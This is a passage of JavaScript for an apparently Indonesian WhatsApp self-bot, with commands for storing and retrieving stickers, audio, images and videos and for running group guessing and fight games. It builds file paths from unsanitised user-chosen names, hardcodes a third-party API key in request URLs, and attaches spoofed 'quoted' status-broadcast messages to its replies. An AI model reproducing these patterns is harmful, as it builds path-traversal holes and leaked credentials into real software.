 exec(`ffmpeg -i ${media} -filter:a "atempo=0.7,asetrate=44100" ${ran}`, (err, stderr, stdout) => {



fs.unlinkSync(media)



if (err) return reply('Error!')



  hah = fs.readFileSync(ran)



wann.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: freply})



fs.unlinkSync(ran)



 })



 break



 case 'stickerlist':



 case 'liststicker':



 teks = '*Sticker List :*\n\n'



 for (let awokwkwk of setiker) {



  teks += `- ${awokwkwk}\n`



}



teks += `\n*Total : ${setiker.length}*`



wann.sendMessage(from, teks.trim(), extendedText, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_「 の ＭｅＩｋｙ あ」_", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('media/Menu.jpg')} } }, contextInfo: { "mentionedJid": setiker } })



wann.sendMessage(from, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_「 の ＭｅＩｋｙ あ」_", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('media/Menu.jpg')}}}})







break



case 'addsticker':







svst = body.slice(12)



if (!svst) return reply('Nama sticker nya apa?')



 boij = JSON.parse(JSON.stringify(wan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo



  delb = await wann.downloadMediaMessage(boij)



  setiker.push(`${svst}`)



  fs.writeFileSync(`./media/sticker/${svst}.webp`, delb)



  fs.writeFileSync('./media/stick.json', JSON.stringify(setiker))



  wann.sendMessage(from, `Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststicker`, MessageType.text, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_「 の ＭｅＩｋｙ あ」_", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('media/Menu.jpg')} } } })



  wann.sendMessage(from, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_「 の ＭｅＩｋｙ あ」_", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('media/Menu.jpg')}}}})







  break











  case 'stickerlist':



  case 'liststicker':



  teks = '*Sticker List :*\n\n'



  for (let awokwkwk of setiker) {



teks += `- ${awokwkwk}\n`



 }



 teks += `\n*Total : ${setiker.length}*`



 wann.sendMessage(from, teks.trim(), extendedText, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_「 の ＭｅＩｋｙ あ」_", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('image/odc.jpeg')} } }, contextInfo: { "mentionedJid": setiker } })



 wann.sendMessage(from, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_「 の ＭｅＩｋｙ あ」_", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('image/odc.jpeg')}}}})







 break



 case 'addsticker':
 svst = body.slice(12)



 if (!svst) return reply('Nama sticker nya apa?')



  boij = JSON.parse(JSON.stringify(wan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo



delb = await wann.downloadMediaMessage(boij)



setiker.push(`${svst}`)



fs.writeFileSync(`./media/sticker/${svst}.webp`, delb)



fs.writeFileSync('./media/stick.json', JSON.stringify(setiker))



wann.sendMessage(from, `Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststicker`, MessageType.text, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_「 の ＭｅＩｋｙ あ」_", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('image/odc.jpeg')} } } })



wann.sendMessage(from, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_「 の ＭｅＩｋｙ あ」_", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('image/odc.jpeg')}}}})







break











case 'addvn':







svst = body.slice(7)



if (!svst) return reply('Nama audionya apa su?')



  boij = JSON.parse(JSON.stringify(wan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo



delb = await wann.downloadMediaMessage(boij)



audionye.push(`${svst}`)



fs.writeFileSync(`./src/audio/${svst}.mp3`, delb)



fs.writeFileSync('./src/audio.json', JSON.stringify(audionye))



wann.sendMessage(from, `Sukses Menambahkan Vn ke dalam database\nSilahkann Cek dengan cara ${prefix}listvn`, MessageType.text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_SelfBot OnlyDev City_", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JStw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('image/odc.jpeg')} }} }) 



break



case 'getvn':



if (args.length < 1) return reply('Masukan nama yang terdaftar di list vn')



  namastc = body.slice(7)



buffer = fs.readFileSync(`./src/audio/${namastc}.mp3`)



wann.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4',  quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_SelfBot OnlyDev City_", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JStw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('image/odc.jpeg')} }}, ptt: true })



break



case 'getsticker':



case 'gets':



if (args.length < 1) return reply('Masukan nama yang terdaftar di list sticker')



  namastc = body.slice(12)



result = fs.readFileSync(`./src/sticker/${namastc}.webp`)



wann.sendMessage(from, result, sticker)



break



case 'liststicker':



teks = '*Sticker List :*\n\n'



for (let awokwkwk of setiker) {



 teks += `- ${awokwkwk}\n`



}



teks += `\n*Total : ${setiker.length}*`



wann.sendMessage(from, teks.trim(), extendedText, {  quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_SelfBot OnlyDev City_", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JStw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('image/odc.jpeg')} }}, contextInfo: { "mentionedJid": setiker } })



break



case 'listvn':



case 'vnlist':



teks = '*List Vn:*\n\n'



for (let awokwkwk of audionye) {



 teks += `- ${awokwkwk}\n`



}



teks += `\n*Total : ${audionye.length}*`



wann.sendMessage(from, teks.trim(), extendedText, {  quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_SelfBot OnlyDev City_", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JStw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('image/odc.jpeg')} }}, contextInfo: { "mentionedJid": audionye } })



break



case 'addimage':



if (!isQuotedImage) return reply('Reply imagenya blokk!')



  svst = body.slice(10)



if (!svst) return reply('Nama imagenya apa su?')



  boij = JSON.parse(JSON.stringify(wan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo



delb = await wann.downloadMediaMessage(boij)



imagenye.push(`${svst}`)



fs.writeFileSync(`./src/image/${svst}.jpeg`, delb)



fs.writeFileSync('./src/image.json', JSON.stringify(imagenye))



wann.sendMessage(from, `Sukses Menambahkan image ke dalam database\nSilahkan cek dengan cara ${prefix}listimage`, MessageType.text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_SelfBot OnlyDev City_", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JStw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('image/odc.jpeg')} }} }) 







break



case 'getimage':



case 'getimg':



if (args.length < 1) return reply('Masukan nama yang terdaftar di list image')



  namastc = body.slice(10)



buffer = fs.readFileSync(`./src/image/${namastc}.jpeg`)



wann.sendMessage(from, buffer, image, {  quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_SelfBot OnlyDev City_", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JStw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('image/odc.jpeg')} }}, caption: `Result From Database : ${namastc}.jpeg` })



break



case 'imagelist':



case 'listimage':



teks = '*List Image :*\n\n'



for (let awokwkwk of imagenye) {



 teks += `- ${awokwkwk}\n`



}



teks += `\n*Total : ${imagenye.length}*`



wann.sendMessage(from, teks.trim(), extendedText, {  quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_SelfBot OnlyDev City_", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JStw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('image/odc.jpeg')} }}, contextInfo: { "mentionedJid": imagenye } })



break







case 'addvideo':



if (!isQuotedVideo) return reply('Reply videonya blokk!')



  svst = body.slice(10)



if (!svst) return reply('Nama videonya apa su?')



  boij = JSON.parse(JSON.stringify(wan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo



delb = await wann.downloadMediaMessage(boij)



videonye.push(`${svst}`)



fs.writeFileSync(`./src/video/${svst}.mp4`, delb)



fs.writeFileSync('./src/video.json', JSON.stringify(videonye))



wann.sendMessage(from, `Sukses Menambahkan Video\nCek dengan cara ${prefix}listvideo`, MessageType.text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_SelfBot OnlyDev City_", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JStw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('image/odc.jpeg')} }} }) 



break



case 'getvideo':



if (args.length < 1) return reply('Masukan nama yang terdaftar di list video')



  namastc = body.slice(10)



buffer = fs.readFileSync(`./src/video/${namastc}.mp4`)



wann.sendMessage(from, buffer, video, { mimetype: 'video/mp4', quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_SelfBot OnlyDev City_", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JStw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('image/odc.jpeg')} }} }) 



break



case 'listvideo':



case 'videolist':



teks = '*List Video :*\n\n'



for (let awokwkwk of videonye) {



 teks += `- ${awokwkwk}\n`



}



teks += `\n*Total : ${videonye.length}*`



wann.sendMessage(from, teks.trim(), extendedText, {  quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_SelfBot OnlyDev City_", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JStw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('image/odc.jpeg')} }}, contextInfo: { "mentionedJid": videonye } })



break







//------------------< Game >------------------



case 'limitgame': 



case 'balance': 



const balance = atm.checkATMuser(sender, _uang)



if (isPremium) return reply(`Limit Game : Unlimited\nBalance : Rp.${balance}`)



 textImg(`Limit Game : ${cekGLimit(sender, gcount, glimit)}/${gcount}\nBalance : Rp.${balance}`)



break



case 'gelud':



if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)



 if (!isGroup) return reply(mess.only.group)



if (wan.message.extendedTextMessage.contextInfo.mentionedJid > 1) return reply('Hanya bisa dengan 1 orang')



  if (!wan.message.extendedTextMessage.contextInfo.mentionedJid[0]) return



 if (args.length === 0) return reply(`Tag Lawan Yang Ingin Diajak Bermain Game`)



if (fs.existsSync(`./media/${from}.json`)) return reply(`Sedang Ada Sesi, tidak dapat dijalankan secara bersamaan\nKetik *${prefix}delsesigelud*, untuk menghapus sesi`)
  gelutSkuy = setGelud(`${from}`)



gelutSkuy.status = false



gelutSkuy.Z = sender.replace("@s.whatsapp.net", "")



gelutSkuy.Y = args[0].replace("@", "");



fs.writeFileSync(`./media/${from}.json`, JSON.stringify(gelutSkuy, null, 2))



starGame = `👑 Memulai Game Baku Hantam ????







• @${sender.replace("@s.whatsapp.net", "")} Menantang Bergelud



[ ${args[0]} ] Ketik Y/N untuk menerima atau menolak permainan`







wann.sendMessage(from, starGame, text, {quoted: freply, contextInfo: { mentionedJid: [sender, args[0].replace("@", "") + "@s.whatsapp.net"],}})



gameAdd(sender, glimit)



break



case 'delsesigelud':



if (!isGroup) return reply(mess.only.group)



  if (fs.existsSync('./media/' + from + '.json')) {



 fs.unlinkSync('./media/' + from + '.json')



 reply('Berhasil Menghapus Sesi Gelud')



  } else {



 reply('Tidak ada sesi yang berlangsung')



  }



  break



  case 'delsesittt':



  case 'resetgame':



  if (!isGroup) return reply(mess.only.group)



 if (!isTTT) return reply('Tidak Ada Permainan Di Grub Ini')



naa = ky_ttt.filter(toek => !toek.id.includes(from)) 



 ky_ttt = naa 



 reply('Sukses Mereset Game')



 break



 case 'tictactoe':



 case 'ttt':



 if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)



  if (!isGroup) return reply(mess.only.group)



 if (args.length < 1) return reply('Tag Lawan Anda! ')



if (isTTT) return reply('Sedang Ada Permainan Di Grub Ini, Harap Tunggu')



  if (wan.message.extendedTextMessage === undefined || wan.message.extendedTextMessage === null) return reply('Tag target Lawan!')



 ment = wan.message.extendedTextMessage.contextInfo.mentionedJid



  player1 = sender



  player2 = ment[0]



  angka = ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]



  id = from



  gilir = player2



  ky_ttt.push({player1,player2,id,angka,gilir})



  wann.sendMessage(from, 



 `*🎳 Memulai Game Tictactoe 🎲*
 [@${player2.split('@')[0]}] Menantang anda untuk menjadi lawan Game🔥



 Ketik Y/N untuk menerima atau menolak permainan
 Ket : Ketik /resetgame , Untuk Mereset Permainan Yg Ada Di Grup!`, text, {contextInfo: {mentionedJid: [player2]}})
  gameAdd(sender, glimit)



  break



  case 't':



  titid =  `SILAHKAN PILIH DI BAWAH UNTUK MELANJUTKAN`
  sendButMessage(from, titid, `crated wann`, [



  {



 buttonId: `Y`,



 buttonText: {



displayText: `Y`,



 },



 type: 1,




  },



  {



 buttonId: `N`,



 buttonText: {



displayText: `N`,



 },



 type: 1,



  },



  ]);




  break



  case 'family100':



  if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)



 if (game.isfam(from, family100)) return reply(`Masih ada soal yang belum di selesaikan`)



anu = await axios.get(`http://api.lolhuman.xyz/api/tebak/family100?apikey=IkyChan`)



 titid =  `*JAWABLAH SOAL BERIKUT*\n\n*Soal :* ${anu.data.result.question}\nTotal Jawaban :* ${anu.data.result.answer.length}\n\nWaktu : ${gamewaktu}s `
 sendButMessage(from, titid, `Klik Untuk Ke Game Selanjutnya`, [



 {



buttonId: `${prefix}family100`,



buttonText: {



  displayText: `⬡ NEXT `,



},



type: 1,



 },]);




 let anoh = anu.data.result.aswer



 let rgfds = []



 for (let i of anoh){



let fefs = i.split('/') ? i.split('/')[0] : i



let iuhbb = fefs.startsWith(' ') ? fefs.replace(' ','') : fefs



let axsf = iuhbb.endsWith(' ') ? iuhbb.replace(iuhbb.slice(-1), '') : iuhbb



rgfds.push(axsf.toLowerCase())



 }



 game.addfam(from, rgfds, gamewaktu, family100)



 gameAdd(sender, glimit)



 break



 case 'tebakanime':



 if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)



if (tebakanime.hasOwnProperty(sender.split('@')[0])) return reply("Selesein yg sebelumnya dulu atuh")



  get_result = await fetchJson(`http://Api.lolhuman.xyz/api/tebakchara?apikey=IkyChan`)



get_result = get_result.result



ini_image = get_result.image



jawaban = get_result.name



kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')



ini_buffer = await getBuffer(ini_image)



wann.sendMessage(from, ini_buffer, image, { quoted: freply, caption: '*+* ```Tebak Anime```\n\n• *Petunjuk* :'+kisi_kisi+'\n• *Waktu* : 30s' }).then(() => {



  tebakanime[sender.split('@')[0]] = jawaban.toLowerCase()



  fs.writeFileSync("./database/tebakanime.json", JSON.stringify(tebakanime))



})



await sleep(30000)



if (tebakanime.hasOwnProperty(sender.split('@')[0])) {



  console.log(color("Jawaban: " + jawaban))



  titid = "*Jawaban*: " + jawaban



  sendButMessage(from, titid, `Klik Untuk Ke Game`, [



  {



 buttonId: `${prefix}tebakanime`,



 buttonText: {



displayText: `⬡ NEXT `,



 },



 type: 1,



  },]);
  delete tebakanime[sender.split('@')[0]]



  fs.writeFileSync("./database/tebakanime.json", JSON.stringify(tebakanime))



}



gameAdd(sender, glimit)



break



case 'tebaklagu':



if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)



  if (tebaklagu.hasOwnProperty(sender.split('@')[0])) return reply("Selesein yg sebelumnya dulu atuh")



 get_result = await fetchJson(`https://api.xteam.xyz/game/tebaklagu?apikey=${setting.xteamkey}&id=4mFuArYRh3SO8jfffYLSER`)



  get_result = get_result.result



  ini_audio = get_result.preview



  jawaban = get_result.judul



  kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')



  ini_buffer = await getBuffer(ini_audio)



  reply('*+* ```Tebak Lagu```\n\n• *Petunjuk* :'+kisi_kisi+'\n• *Waktu* : 30s')



  wann.sendMessage(from, ini_buffer, audio, {quoted: freply}).then(() => {



 tebaklagu[sender.split('@')[0]] = jawaban.toLowerCase()



 fs.writeFileSync("./database/tebaklagu.json", JSON.stringify(tebaklagu))



  })



  await sleep(30000)



  if (tebaklagu.hasOwnProperty(sender.split('@')[0])) {



 console.log(color("Jawaban: " + jawaban))



